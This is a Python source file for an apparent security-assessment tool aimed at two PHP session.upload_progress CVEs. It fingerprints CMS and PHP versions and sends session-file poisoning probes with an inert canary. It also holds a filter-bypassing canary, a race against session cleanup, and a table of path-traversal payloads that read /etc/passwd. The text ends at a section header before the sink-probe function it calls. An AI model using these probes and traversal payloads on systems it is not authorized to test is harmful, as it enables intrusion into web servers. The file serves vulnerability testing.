#!/usr/bin/env python3
"""
================================================================================
 PHP2Shell — CVE-2026-109618 / CVE-2026-109619 research & assessment tool
================================================================================
 Author   : sudo3rs (Mas Rian)
 GitHub   : https://github.com/masriyan/php2shell
 LinkedIn : https://www.linkedin.com/in/sudo3rs/

 Authorized use only. PUBLIC RELEASE.
 Run only against systems you own or have explicit written authorization to test.
================================================================================


WHAT THIS TOOL ACTUALLY DOES (AND DOES NOT DO)
----------------------------------------------
The PHP2Shell vulnerabilities are PHP-core bugs tied to the
`session.upload_progress` feature. The confirmed, publicly-documented
primitive is SESSION-FILE POISONING, not PHP object deserialization:

  P1  Set a session ID cookie-lessly via a `PHPSESSID` field in the multipart body.
  P2  Inject arbitrary content (e.g. `<?php ...`) into the session file via the
      `PHP_SESSION_UPLOAD_PROGRESS` field value and the uploaded filename, which
      PHP serializes verbatim into `sess_<id>`.

The injected content only becomes CODE EXECUTION when the target application
performs an `include()` / `require()` on the poisoned session file. Stock
WordPress / Joomla / Drupal do NOT hand you that sink — turning this into RCE
requires a separately vulnerable app/plugin (an LFI-to-include, a template
include, etc.), which this tool does not provide.

This tool therefore does three honest things:
  1. Detect the CMS and PHP version/type of a target (fingerprinting).
  2. Verify the poisoning PRIMITIVE (P1 + P2) against the target, using an
     INERT canary (a PHP comment, never a shell), and report whether the
     target is likely affected by the session.upload_progress bug.
  3. Optionally probe for candidate include() sinks (LFI-style endpoints) that
     an operator would need to chain for actual RCE.

It does NOT ship a working RCE gadget chain, because none has been publicly
confirmed as of the advisory window. The earlier "GenericClass / __destruct /
system()" payload was fabricated and has been removed.


HOW THIS SCRIPT WORKS (step by step)
------------------------------------
  1. PROMPT / PARSE TARGET
     The URL comes from `--url/-u` or an interactive prompt. It is normalized
     to `scheme://host` and a `requests.Session` is built with TLS-verify off
     (deliberate, for research against self-signed/misconfigured hosts).

  2. CMS FINGERPRINTING        -> detect_cms()
     Three signal layers are combined and scored (confidence: low/med/high):
       - response HEADERS (e.g. X-Generator, X-Magento, Laravel, Symfony)
       - <meta name="generator"> in the HTML body
       - known PATH probes (wp-login.php, /administrator/, /user/login, ...)
     Recognized: WordPress, Joomla, Drupal, Magento, Laravel, CodeIgniter,
     Symfony, phpBB, PrestaShop, OpenCart, Typo3. Falls back to
     "Unknown (generic PHP?)" when nothing matches.

  3. PHP VERSION / TYPE        -> detect_php()
       - VERSION from `X-Powered-By: PHP/x.y.z` (or generator meta fallback).
       - TYPE from the `Server` header (e.g. "fpm" => PHP-FPM).
       - SUPPORT STATUS mapped via PHP_SUPPORT -> php_support_status():
         active / security-only / EOL. EOL branches (5.x/7.x/8.0/8.1) are
         flagged because research indicates they will NOT receive an official
         PHP2Shell fix.

  4. CONFIRMATION GATE
     Unless `--no-confirm` is passed, the user must approve before any
     multipart probe is sent.

  5. POISONING PRIMITIVE PROBE  -> probe_upload_progress() + build_poison_body()
     A single multipart POST exercises both primitives with an INERT canary
     (a `<?php /* ... */ ?>` comment — never a shell):
       - field PHPSESSID=<sid>                     (P1: cookie-less session id)
       - field PHP_SESSION_UPLOAD_PROGRESS=<canary> (P2: value injection)
       - file upload whose filename = <canary>      (P2: filename injection)
     If PHP replies with `Set-Cookie: PHPSESSID` (or any session cookie), P1
     is CONFIRMED — PHP accepted the cookie-less session id.

  6. EXPOSURE VERDICT          -> assess_vulnerability()
     Combines the P1/P2 observation with the PHP support status to emit a
     coarse, honest verdict:
       LIKELY AFFECTED / POTENTIALLY AFFECTED / EOL PHP /
       PRIMITIVE NOT OBSERVED / UNREACHABLE.
     This is an ESTIMATE only — official affected/fixed versions are still
     unpublished (NVD returns 0 results for both CVEs as of this writing).

  7. OPTIONAL SINK SCAN        -> probe_include_sinks()   (--sink-scan)
     Probes per-CMS candidate include()/LFI endpoints (read-only /etc/passwd
     checks) that an operator would need to chain with the poisoned session
     file to achieve actual RCE.


OPERATION MODES (--mode)
-------------------------
  IMPORTANT: NEITHER mode performs code execution. There is no RCE payload,
  no shell upload, no file write, no gadget chain in this tool. Both modes
  are purely OBSERVATIONAL — they only check whether the poisoning primitive
  can be OBSERVED.

  passive (default)  Minimally intrusive. One multipart probe with a plain
                     PHP-comment canary. No code execution, no state beyond an
                     ephemeral session marker. Recommended for assessment.

  active             More aggressive OBSERVATION — still NON-destructive.
                     Strengthens the probe so the primitive is more likely to
                     be observable:
                       - whitespace/newline-padded canary to defeat naive
                         `<?php` prefix filters (stays a comment when parsed),
                       - concurrent + large-body requests to race
                         session.upload_progress.cleanup (default On) and widen
                         the window where the poisoned session file exists.
                     "active" means "actively probing", NOT "actively
                     exploiting". It never uploads a shell, never writes files,
                     never executes code.

Research note: exploitation of this primitive into RCE requires (a) the race
window to exist (cleanup off, or a sufficiently slow upload) and (b) an
app-side include()/require() of the session file (an LFI sink). This tool
verifies (a) and enumerates candidates for (b); it does not perform the RCE.


DISCLAIMER
----------
This tool verifies an observable primitive and assesses exposure. It is not a
weaponized RCE exploit, and it does not perform code execution against any
target. Use responsibly and only within scope.
"""

import argparse
import re
import sys
import time
import uuid
import urllib3
import threading
import requests
from urllib.parse import urljoin, urlparse

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
USER_AGENT = "sudo3rs-PHP2Shell-Checker/1.4.0"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TIMEOUT = 15

# ---------------------------------------------------------------------------
# Operation modes
# ---------------------------------------------------------------------------
# IMPORTANT: NEITHER mode performs code execution. This tool has no RCE
# payload, no shell upload, no file write, and no gadget chain. Both modes are
# purely observational — they only verify whether the session.upload_progress
# poisoning primitive (P1 + P2) can be OBSERVED on the target.
#
# passive (default) — minimally intrusive. One multipart probe with a plain
#         PHP-comment canary. No state beyond an ephemeral session marker.
#
# active  — more aggressive OBSERVATION (still non-destructive, no code exec).
#         Uses a whitespace-padded canary to defeat naive `<?php` prefix
#         filters, and races session.upload_progress.cleanup (default On) with
#         concurrent + large-body requests to widen the window where the
#         poisoned session file exists — purely so the primitive can be
#         OBSERVED. It never executes anything; it only tries to WATCH the
#         primitive land.
#
# The name "active" means "actively probing", NOT "actively exploiting".
MODES = ("passive", "active")

# ---------------------------------------------------------------------------
# CMS fingerprint signatures
# ---------------------------------------------------------------------------
CMS_SIGNATURES = [
    {
        "name": "WordPress",
        "generator": r"wordpress",
        "headers": [r"wp-json", r"wordpress"],
        "paths": [
            ("/wp-login.php", {200, 301, 302}, r"(wp-login|wordpress|user_login|wp-submit)"),
            ("/wp-includes/wlwmanifest.xml", {200, 301, 302}, r"(wlwmanifest|wordpress)"),
            ("/wp-json/", {200, 301, 302}, r"(rest_|routes|namespace)"),
            ("/xmlrpc.php", {200, 405, 301, 302}, r"(XML-RPC|methodCall|incorrect_method)"),
        ],
    },
    {
        "name": "Joomla",
        "generator": r"joomla",
        "headers": [r"joomla"],
        "paths": [
            ("/administrator/", {200, 301, 302}, r"(joomla|Joomla|mod_login|com_login)"),
            ("/media/system/js/core.js", {200}, r"(Drupal|Joomla|MooTools|Media\\.system)"),
        ],
    },
    {
        "name": "Drupal",
        "generator": r"drupal",
        "headers": [r"x-generator.*drupal", r"x-drupal"],
        "paths": [
            ("/user/login", {200, 301, 302}, r"(user-login|Drupal|form_id.*user_login|drupal)"),
            ("/misc/drupal.js", {200}, r"(Drupal|drupal)"),
        ],
    },
    {
        "name": "Magento",
        "generator": r"magento",
        "headers": [r"x-magento"],
        "paths": [
            ("/admin", {200, 301, 302, 401}, r"(magento|Magento|adminhtml)"),
            ("/skin/frontend/", {200, 301, 302}, r"(magento|Magento|skin|frontend)"),
        ],
    },
    {
        "name": "Laravel",
        "generator": r"laravel",
        "headers": [r"laravel"],
        "paths": [
            ("/login", {200, 301, 302}, r"(laravel|Laravel|csrf-token|_token)"),
        ],
    },
    {
        "name": "CodeIgniter",
        "generator": r"codeigniter",
        "headers": [r"codeigniter"],
        "paths": [("/index.php", {200, 301, 302}, r"(codeigniter|CodeIgniter)")],
    },
    {
        "name": "Symfony",
        "generator": r"symfony",
        "headers": [r"symfony", r"x-debug-token"],
        "paths": [("/_profiler", {200, 301, 302}, r"(symfony|Symfony|token)")],
    },
    {
        "name": "phpBB",
        "generator": r"phpbb",
        "headers": [r"phpbb"],
        "paths": [("/ucp.php", {200, 301, 302}, r"(phpbb|phpBB)")],
    },
    {
        "name": "PrestaShop",
        "generator": r"prestashop",
        "headers": [r"prestashop", r"ps-"],
        "paths": [
            ("/index.php?controller=authentication", {200, 301, 302}, r"(prestashop|PrestaShop)"),
        ],
    },
    {
        "name": "OpenCart",
        "generator": r"opencart",
        "headers": [],
        "paths": [
            ("/index.php?route=account/login", {200, 301, 302}, r"(opencart|OpenCart)"),
        ],
    },
    {
        "name": "Typo3",
        "generator": r"typo3",
        "headers": [r"typo3"],
        "paths": [("/typo3/", {200, 301, 302, 401}, r"(typo3|TYPO3)")],
    },
]

# ---------------------------------------------------------------------------
# PHP support lifecycle (for EOL exposure assessment)
# ---------------------------------------------------------------------------
# Sources: php.net/supported-versions, herodevs, tuxcare (as of 2026).
# Key insight from PHP2Shell research: only supported branches (8.2+) will
# receive an official fix. EOL branches (5.x/7.x/8.0/8.1) get NO fix.
PHP_SUPPORT = [
    ("8.6", "active",    "in development (RC)"),
    ("8.5", "active",    "supported — will get fix"),
    ("8.4", "active",    "supported — will get fix"),
    ("8.3", "security",  "security-only — will get fix"),
    ("8.2", "security",  "security-only — will get fix (EOL 2026-12-31)"),
    ("8.1", "eol",       "EOL — NO official fix expected"),
    ("8.0", "eol",       "EOL — NO official fix expected"),
    ("7.4", "eol",       "EOL — NO official fix expected"),
    ("7.3", "eol",       "EOL — NO official fix expected"),
    ("7.2", "eol",       "EOL — NO official fix expected"),
    ("7.1", "eol",       "EOL — NO official fix expected"),
    ("7.0", "eol",       "EOL — NO official fix expected"),
    ("5.6", "eol",       "EOL — NO official fix expected"),
    ("5.5", "eol",       "EOL — NO official fix expected"),
    ("5.4", "eol",       "EOL — NO official fix expected"),
    ("5.3", "eol",       "EOL — NO official fix expected"),
    ("5.2", "eol",       "EOL — NO official fix expected"),
]


def php_support_status(version):
    """Map a detected PHP version string to a support-status dict."""
    if not version:
        return None
    m = re.match(r"(\d+)\.(\d+)", version)
    if not m:
        return None
    major, minor = int(m.group(1)), int(m.group(2))
    branch = f"{major}.{minor}"
    # Find the closest known branch (prefix match on minor, then fall back)
    for known, status, note in PHP_SUPPORT:
        k_major, k_minor = known.split(".")
        if int(k_major) == major and int(k_minor) == minor:
            return {"branch": known, "status": status, "note": note}
    # Unknown minor: infer from major
    if major >= 8:
        if minor >= 2:
            return {"branch": branch, "status": "supported", "note": "assumed supported (8.2+)"}
        return {"branch": branch, "status": "eol", "note": "assumed EOL (< 8.2)"}
    return {"branch": branch, "status": "eol", "note": "assumed EOL (< 8.2)"}


# ---------------------------------------------------------------------------
# Per-CMS candidate include()/LFI sink signatures
# ---------------------------------------------------------------------------
# Common include-style / LFI endpoints per CMS that could be chained with a
# poisoned session file for actual RCE. None is a guaranteed sink; these are
# candidates an operator inspects. Read-only /etc/passwd probes only.
CMS_SINK_SIGNATURES = {
    "WordPress": [
        ("/wp-content/plugins/akismet/readme.txt", r"akismet|wordpress"),
        ("/wp-includes/version.php", r"wp_version"),
        ("/index.php?p=../../../../etc/passwd", r"root:x:0:0"),
        ("/?page=../../../../etc/passwd", r"root:x:0:0"),
    ],
    "Joomla": [
        ("/index.php?option=com_content&view=../../../../etc/passwd", r"root:x:0:0"),
        ("/index.php?lang=../../../../etc/passwd", r"root:x:0:0"),
    ],
    "Drupal": [
        ("/index.php?q=../../../../etc/passwd", r"root:x:0:0"),
        ("/CHANGELOG.txt", r"drupal"),
    ],
    "Magento": [
        ("/index.php/?file=../../../../etc/passwd", r"root:x:0:0"),
    ],
    "Laravel": [
        ("/?file=../../../../etc/passwd", r"root:x:0:0"),
        ("/index.php?page=../../../../etc/passwd", r"root:x:0:0"),
    ],
    "default": [
        ("/index.php?page=../../../../etc/passwd", r"root:x:0:0"),
        ("/index.php?file=../../../../etc/passwd", r"root:x:0:0"),
        ("/index.php?lang=../../../../etc/passwd", r"root:x:0:0"),
        ("/download.php?file=../../../../etc/passwd", r"root:x:0:0"),
    ],
}


# ---------------------------------------------------------------------------
# Terminal colors
# ---------------------------------------------------------------------------
class C:
    enabled = sys.stdout.isatty()

    @staticmethod
    def _wrap(code, text):
        return f"\033[{code}m{text}\033[0m" if C.enabled else text

    @staticmethod
    def red(t):     return C._wrap("31", t)
    @staticmethod
    def green(t):   return C._wrap("32", t)
    @staticmethod
    def yellow(t):  return C._wrap("33", t)
    @staticmethod
    def blue(t):    return C._wrap("34", t)
    @staticmethod
    def magenta(t): return C._wrap("35", t)
    @staticmethod
    def cyan(t):    return C._wrap("36", t)
    @staticmethod
    def bold(t):    return C._wrap("1", t)
    @staticmethod
    def dim(t):     return C._wrap("2", t)


def banner():
    print(C.cyan(C.bold("""
    ┌───────────────────────────────────────────────────────────────┐
    │  PHP2Shell  (CVE-2026-109618 / CVE-2026-109619)               │
    │  by sudo3rs — internal research tool                          │
    │  session.upload_progress poisoning + detection                │
    └───────────────────────────────────────────────────────────────┘
    """)))


# ---------------------------------------------------------------------------
# URL handling
# ---------------------------------------------------------------------------
def normalize_url(raw):
    raw = raw.strip()
    if not raw:
        return None
    if not raw.startswith(("http://", "https://")):
        raw = "http://" + raw
    parsed = urlparse(raw)
    if not parsed.netloc:
        return None
    scheme = parsed.scheme or "http"
    return f"{scheme}://{parsed.netloc}"


def prompt_url(args_url):
    if args_url:
        url = normalize_url(args_url)
        if url:
            print(C.green(f"[+] Target URL : {url}"))
            return url
        print(C.red("[!] Invalid URL passed via --url, falling back to prompt."))

    while True:
        raw = input(C.cyan("[?] Enter target URL (empty = quit): ")).strip()
        if raw.lower() in ("exit", "quit", "q", ""):
            return None
        url = normalize_url(raw)
        if url:
            return url
        print(C.red("[!] Invalid URL. Use format example.com or https://example.com"))


def make_session():
    s = requests.Session()
    s.headers.update({
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    })
    s.verify = False
    return s


# ---------------------------------------------------------------------------
# CMS detection
# ---------------------------------------------------------------------------
def detect_cms(base_url, session):
    evidence = []
    scores = {}

    def add(name, msg):
        evidence.append(f"[{name}] {msg}")
        scores[name] = scores.get(name, 0) + 1

    try:
        r = session.get(base_url + "/", timeout=TIMEOUT)
        homepage_ok = True
    except requests.RequestException as e:
        print(C.yellow(f"[!] Homepage request failed: {e}"))
        homepage_ok = False
        r = None

    if homepage_ok and r is not None:
        body = r.text or ""
        headers_lower = {k.lower(): v for k, v in r.headers.items()}
        joined = " ".join(headers_lower.values())

        for sig in CMS_SIGNATURES:
            for h in sig["headers"]:
                if re.search(h, joined, re.IGNORECASE):
                    add(sig["name"], f"header match: {h}")

        gen_match = re.search(
            r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']([^"\']+)["\']',
            body, re.IGNORECASE,
        )
        if gen_match:
            gen_val = gen_match.group(1)
            for sig in CMS_SIGNATURES:
                if re.search(sig["generator"], gen_val, re.IGNORECASE):
                    add(sig["name"], f"generator meta: {gen_val}")

        if "wp-content" in body or "wp-includes" in body:
            add("WordPress", "body references wp-content/wp-includes")

    # Generic "not found" / error signatures that invalidate a path probe
    # match. Prevents false positives from servers that return 200 with an
    # error/soft-404 page for unknown paths (e.g. PHP built-in server).
    _404_PATTERNS = [
        r"404\s+(page\s+)?not\s+found",
        r"page\s+not\s+found",
        r"not\s+found",
        r"no\s+input\s+file\s+specified",
        r"file\s+not\s+found",
    ]

    def _looks_like_404(text):
        low = (text or "").lower()
        for p in _404_PATTERNS:
            if re.search(p, low):
                return True
        return False

    for sig in CMS_SIGNATURES:
        for path, ok_status, needle in sig["paths"]:
            url = urljoin(base_url + "/", path.lstrip("/"))
            try:
                pr = session.get(url, timeout=TIMEOUT, allow_redirects=True)
            except requests.RequestException:
                continue
            if pr.status_code not in ok_status:
                continue
            text = pr.text or ""
            # Skip if this looks like a generic 404/error page.
            if _looks_like_404(text):
                continue
            # A needle is now mandatory: a bare 200 with no content match is
            # too weak a signal and causes false positives.
            if needle and re.search(needle, text, re.IGNORECASE):
                add(sig["name"], f"path {path} -> {pr.status_code}")

    if not scores:
        return {"name": "Unknown (generic PHP?)", "confidence": "low",
                "evidence": evidence or ["no CMS signatures matched"]}

    best = max(scores, key=lambda k: scores[k])
    total = scores[best]
    confidence = "high" if total >= 3 else ("medium" if total == 2 else "low")
    return {"name": best, "confidence": confidence, "evidence": evidence}


# ---------------------------------------------------------------------------
# Per-CMS behavior / version probes
# ---------------------------------------------------------------------------
# Deeper, behavior-based fingerprints: static files that leak an exact CMS
# version, API endpoints, and generated assets. Each entry maps a CMS name to
# a list of (path, needle) probes; a match yields "name + version/behavior".
CMS_BEHAVIOR_PROBES = {
    "WordPress": [
        ("/wp-links-opml.php", r"<generator>http://wordpress\\.org/\\?v=([\\d.]+)"),
        ("/readme.html", r"Version\\s+([\\d.]+)"),
        ("/wp-includes/version.php", r"wp_version\\s*=\\s*'([\\d.]+)'"),
        ("/wp-json/wp/v2/", r'\"namespace\":\\s*\"wp/v2\"'),
    ],
    "Joomla": [
        ("/language/en-GB/en-GB.xml", r"<version>([\\d.]+)</version>"),
        ("/administrator/manifests/files/joomla.xml", r"<version>([\\d.]+)</version>"),
    ],
    "Drupal": [
        ("/CHANGELOG.txt", r"Drupal\\s+([\\d.]+)"),
        ("/core/CHANGELOG.txt", r"Drupal\\s+([\\d.]+)"),
    ],
    "Magento": [
        ("/magento_version", r"Magento/([\\d.]+)"),
        ("/RELEASE_NOTES.txt", r"Magento\\s+([\\d.]+)"),
    ],
    "PrestaShop": [
        ("/config/xml/default_country_modules_list.xml", r"<version>([\\d.]+)</version>"),
    ],
    "OpenCart": [
        ("/index.php?route=common/home", r"opencart"),
    ],
    "phpBB": [
        ("/docs/CHANGELOG.html", r"phpBB\\s+([\\d.]+)"),
    ],
}


def detect_cms_behavior(base_url, session, cms_name):
    """Return a list of (probe_path, matched_text) for deeper, behavior-level
    CMS version/asset detection. Complements detect_cms() for the winning CMS.
    """
    probes = CMS_BEHAVIOR_PROBES.get(cms_name)
    if not probes:
        return []
    findings = []
    for path, needle in probes:
        url = urljoin(base_url + "/", path.lstrip("/"))
        try:
            r = session.get(url, timeout=TIMEOUT, allow_redirects=True)
        except requests.RequestException:
            continue
        if r.status_code != 200:
            continue
        m = re.search(needle, r.text or "")
        if m:
            val = m.group(1) if m.lastindex else "present"
            findings.append((path, val))
    return findings


# ---------------------------------------------------------------------------
# PHP version / type detection
# ---------------------------------------------------------------------------
def detect_php(base_url, session):
    result = {"version": None, "type": None, "support": None, "evidence": []}

    def add(msg):
        result["evidence"].append(msg)

    try:
        r = session.get(base_url + "/", timeout=TIMEOUT)
        h = {k.lower(): v for k, v in r.headers.items()}
        x_powered = h.get("x-powered-by")
        if x_powered:
            add(f"X-Powered-By: {x_powered}")
            m = re.search(r"PHP/([\d.]+)", x_powered, re.IGNORECASE)
            if m:
                result["version"] = m.group(1)
        server = h.get("server", "")
        if re.search(r"fpm", server, re.IGNORECASE):
            result["type"] = "PHP-FPM"
            add(f"Server header suggests PHP-FPM: {server}")
    except requests.RequestException as e:
        add(f"header probe failed: {e}")

    try:
        r = session.get(base_url + "/", timeout=TIMEOUT)
        body = r.text or ""
    except requests.RequestException:
        body = ""

    m = re.search(
        r'<meta[^>]+name=["\']generator["\'][^>]+content=["\'][^"\']*PHP[/ ]([\d.]+)',
        body, re.IGNORECASE,
    )
    if m and not result["version"]:
        result["version"] = m.group(1)
        add(f"generator meta suggests PHP {m.group(1)}")

    result["support"] = php_support_status(result["version"])
    return result


# ---------------------------------------------------------------------------
# Defensive config exposure (memory-bug feasibility) — observational only
# ---------------------------------------------------------------------------
def detect_config_exposure(base_url, session):
    """
    Assess the *conditions* that the PHP2Shell memory-corruption class needs,
    using only passive/observable signals. This is DEFENSIVE intel: it tells
    a defender whether the target's configuration would make the bug
    reachable, without exercising any memory corruption.

    Signals gathered (all read-only):
      - session.upload_progress.enabled  (via target-side reflection, if any)
      - session.upload_progress.cleanup  (race-window feasibility)
      - memory_limit vs post_max_size    (OOM-bailout feasibility)
      - SAPI hints (Apache/prefork vs FPM/CGI/LSAPI survival semantics)
    """
    result = {"upload_progress": None, "cleanup": None,
              "memory_limit": None, "post_max_size": None,
              "sapi": None, "notes": []}

    def add(msg):
        result["notes"].append(msg)

    # 1. PHP config reflection endpoints (a target may expose these; absence
    #    is NOT a finding — we only read what the target itself offers).
    reflection_paths = [
        "/?phpinfo=1",
        "/phpinfo.php",
        "/info.php",
        "/_profiler/phpinfo",
    ]
    phpinfo_html = ""
    for p in reflection_paths:
        url = urljoin(base_url + "/", p.lstrip("/"))
        try:
            r = session.get(url, timeout=TIMEOUT, allow_redirects=True)
        except requests.RequestException:
            continue
        if r.status_code == 200 and ("phpinfo" in (r.text or "").lower()
                                     or "directive" in (r.text or "").lower()):
            phpinfo_html = r.text or ""
            add(f"phpinfo reflected via {p}")
            break

    if phpinfo_html:
        m = re.search(r'session\.upload_progress\.enabled[^<]*<td[^>]*>([^<]+)<', phpinfo_html, re.I)
        if m:
            result["upload_progress"] = m.group(1).strip()
        m = re.search(r'session\.upload_progress\.cleanup[^<]*<td[^>]*>([^<]+)<', phpinfo_html, re.I)
        if m:
            result["cleanup"] = m.group(1).strip()
        m = re.search(r'memory_limit[^<]*<td[^>]*>([^<]+)<', phpinfo_html, re.I)
        if m:
            result["memory_limit"] = m.group(1).strip()
        m = re.search(r'post_max_size[^<]*<td[^>]*>([^<]+)<', phpinfo_html, re.I)
        if m:
            result["post_max_size"] = m.group(1).strip()

    # 2. SAPI hint from headers / error pages (survival semantics: prefork
    #    survives a pre-RINIT bailout; FPM/CGI/LSAPI typically do not).
    try:
        r = session.get(base_url + "/", timeout=TIMEOUT)
        h = {k.lower(): v for k, v in r.headers.items()}
        server = h.get("server", "")
        if re.search(r"apache", server, re.I):
            result["sapi"] = "Apache (likely prefork/mod_php)"
        elif re.search(r"fpm|nginx", server, re.I):
            result["sapi"] = "PHP-FPM (via nginx/Apache)"
        elif re.search(r"litespeed|lsapi", server, re.I) or "litespeed" in server.lower():
            result["sapi"] = "LiteSpeed (LSAPI)"
        elif re.search(r"cgi", server, re.I):
            result["sapi"] = "CGI/FastCGI"
        if result["sapi"]:
            add(f"SAPI hint: {result['sapi']}")
    except requests.RequestException:
        pass

    # 3. Interpret: feasibility notes (defensive framing only)
    if result["upload_progress"] is not None:
        up = result["upload_progress"].lower()
        if "off" in up or up == "0":
            add("upload_progress DISABLED — primitive closed (mitigated).")
        else:
            add("upload_progress ENABLED — primitive reachable.")
    if result["cleanup"] is not None:
        cl = result["cleanup"].lower()
        if "off" in cl or cl == "0":
            add("cleanup OFF — no race needed (larger window).")
        else:
            add("cleanup ON (default) — exploitation would be a race.")
    if result["memory_limit"] and result["post_max_size"]:
        add(f"memory_limit={result['memory_limit']} vs post_max_size={result['post_max_size']} "
            f"(OOM-bailout feasibility is config-dependent).")

    return result
def make_canary(mode):
    """Return an inert canary string.

    passive — a plain PHP comment; unmistakably inert, never executes.
    active  — still a comment (never a shell), but wrapped with leading
              whitespace/newlines so it survives naive string filters that
              block `<` immediately followed by `?php`. The whitespace is
              stripped by the PHP tokenizer, so the canary remains inert.
    """
    tag = uuid.uuid4().hex[:8]
    if mode == "active":
        # Whitespace / newline padding defeats simple `<?php`-prefix filters
        # while remaining a comment once PHP parses it.
        return (f"\\n    <?php /* php2shell canary {tag} - inert, no shell */ ?>")\
            .replace("\\n", "\r\n")
    return f"<?php /* php2shell inert canary {tag} - NOT a shell */ ?>"


def build_poison_body(boundary, sid, canary, slow_stream=False):
    """Build a multipart body that exercises P1 (cookie-less session id) and
    P2 (progress marker + filename carrying an inert canary).

    When slow_stream is True (active race mode), the body appends a large
    trailing file part so the upload lingers, widening the window where the
    poisoned session file exists before session.upload_progress.cleanup runs.
    """
    def part(disp, value):
        return (f"--{boundary}\r\nContent-Disposition: form-data; {disp}\r\n\r\n"
                f"{value}\r\n").encode("utf-8")

    body = b""
    body += part('name="PHPSESSID"', sid)                       # P1
    body += part('name="PHP_SESSION_UPLOAD_PROGRESS"', canary)  # P2 (value)
    body += (f"--{boundary}\r\n"
             f'Content-Disposition: form-data; name="file1"; filename="{canary}"\r\n'
             f"Content-Type: application/octet-stream\r\n\r\n").encode("utf-8")
    body += b"CANARYDATA\r\n"

    if slow_stream:
        # A large filler part keeps the multipart stream open longer,
        # extending the lifetime of the progress session entry (race window).
        body += (f"--{boundary}\r\n"
                 f'Content-Disposition: form-data; name="filler"; filename="f.bin"\r\n'
                 f"Content-Type: application/octet-stream\r\n\r\n").encode("utf-8")
        body += b"A" * (512 * 1024)  # 512 KiB of filler
        body += b"\r\n"

    body += f"--{boundary}--\r\n".encode("utf-8")
    return body


def probe_upload_progress(base_url, session, probe_path, mode="passive"):
    """
    Send the poisoning primitive to the target and report observations.

    mode="passive" — single inert probe.
    mode="active"  — inert probe + concurrent requests racing against
                     session.upload_progress.cleanup to make the poisoned
                     session file observable. Still NO code execution.

    Returns a dict of observations.
    """
    sid = "s3rs" + uuid.uuid4().hex[:24]
    canary = make_canary(mode)
    boundary = "----php2shell" + uuid.uuid4().hex
    url = urljoin(base_url + "/", probe_path.lstrip("/"))

    obs = {"sid": sid, "canary": canary, "status": None,
           "php_session_set": None, "p1_via": None, "x_powered_by": None,
           "session_name": "PHPSESSID", "progress_marker_seen": None,
           "mode": mode, "requests_sent": 0, "notes": []}

    def _send(slow):
        body = build_poison_body(boundary, sid, canary, slow_stream=slow)
        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Content-Length": str(len(body)),
        }
        return session.post(url, data=body, headers=headers,
                            timeout=TIMEOUT, allow_redirects=False)

    try:
        if mode == "active":
            # Race: one slow (large) request to keep the session entry alive,
            # plus several concurrent quick requests to widen the window and
            # increase the chance of observing the primitive landing.
            slow_thread = threading.Thread(
                target=lambda: _send(slow=True), daemon=True)
            slow_thread.start()
            time.sleep(0.05)
            results = []
            for _ in range(4):
                try:
                    results.append(_send(slow=False))
                except requests.RequestException:
                    pass
            slow_thread.join(timeout=TIMEOUT)
            obs["requests_sent"] = len(results)
            resp = results[0] if results else None
            if resp is None:
                resp = _send(slow=False)
        else:
            resp = _send(slow=False)
            obs["requests_sent"] = 1

        if resp is None:
            obs["notes"].append("all requests failed")
            return obs

        obs["status"] = resp.status_code
        obs["notes"].append(f"POST {url} -> HTTP {resp.status_code}")
        if mode == "active":
            obs["notes"].append(f"race mode: {obs['requests_sent']} probe requests sent")
        resp_body = resp.text or ""

        # --- P1 detection ---
        # Primary signal: Set-Cookie PHPSESSID (Apache/FPM return a real
        # cookie after accepting the cookie-less session id).
        for c in resp.cookies:
            if c.name.upper() in ("PHPSESSID", "SESSID") or \
               (c.name and "sess" in c.name.lower()):
                obs["php_session_set"] = c.value
                obs["session_name"] = c.name
                obs["p1_via"] = "cookie"
                obs["notes"].append(f"Set-Cookie: {c.name}={c.value[:16]}...")
                break

        # Secondary signal: some targets (e.g. PHP built-in server, or apps
        # that echo session_id()) expose the session id in the body instead of
        # a cookie. If our exact sid is echoed back, P1 is also confirmed.
        if not obs["php_session_set"] and sid in resp_body:
            obs["php_session_set"] = sid
            obs["p1_via"] = "body-echo"
            obs["notes"].append("Session id echoed in response body (P1 accepted).")

        # P2 corroboration: the target itself reports the upload-progress marker.
        if re.search(r"PROGRESS_MARKER_SEEN|upload_progress_", resp_body):
            obs["progress_marker_seen"] = True
            obs["notes"].append("Target confirms PHP_SESSION_UPLOAD_PROGRESS marker was seen.")

        # Expose PHP version in headers (fingerprint corroboration)
        xp = resp.headers.get("X-Powered-By")
        if xp:
            obs["x_powered_by"] = xp
            obs["notes"].append(f"X-Powered-By: {xp}")

        # Heuristic: if the target returned a normal page (200) AND echoed a
        # session cookie, upload_progress processing ran (feature enabled).
        # A 403/415 from a WAF/filter suggests multipart is being blocked.
        if resp.status_code in (403, 415):
            obs["notes"].append("Response 403/415 — multipart may be blocked by WAF/edge rule.")

    except requests.RequestException as e:
        obs["notes"].append(f"request error: {e}")

    return obs


def assess_vulnerability(obs, php):
    """
    Produce a coarse exposure verdict by combining the observed primitive
    behaviour with the detected PHP branch. This is an ESTIMATE, not a proof:
    official affected/fixed versions are still unpublished.
    """
    verdict = {"label": "UNKNOWN", "color": "yellow", "reasons": []}

    p1 = bool(obs.get("php_session_set"))

    # 1. P1/P2 primitive observed (upload_progress enabled + session reachable)
    if p1:
        verdict["reasons"].append("session.upload_progress engaged (Set-Cookie returned)")

    # 2. PHP branch support status
    sup = php.get("support")
    if sup:
        verdict["reasons"].append(f"PHP {sup['branch']} is {sup['status']} ({sup['note']})")
        if sup["status"] == "eol":
            verdict["reasons"].append("EOL branch: no official PHP2Shell fix expected")

    # 3. Combine
    if p1 and sup and sup["status"] == "eol":
        verdict["label"] = "LIKELY AFFECTED (primitive + EOL PHP)"
        verdict["color"] = "red"
    elif p1:
        verdict["label"] = "POTENTIALLY AFFECTED (primitive confirmed, PHP supported)"
        verdict["color"] = "yellow"
    elif sup and sup["status"] == "eol":
        verdict["label"] = "EOL PHP (patch exposure) — primitive not observed"
        verdict["color"] = "yellow"
    elif not p1 and obs.get("status") is None:
        verdict["label"] = "UNREACHABLE"
        verdict["color"] = "red"
    else:
        verdict["label"] = "PRIMITIVE NOT OBSERVED (may be mitigated/patched)"
        verdict["color"] = "green"

    return verdict


# ---------------------------------------------------------------------------
# Candidate include() sink probe (the chain required for actual RCE)
# ---------------------------------------------------------------------------
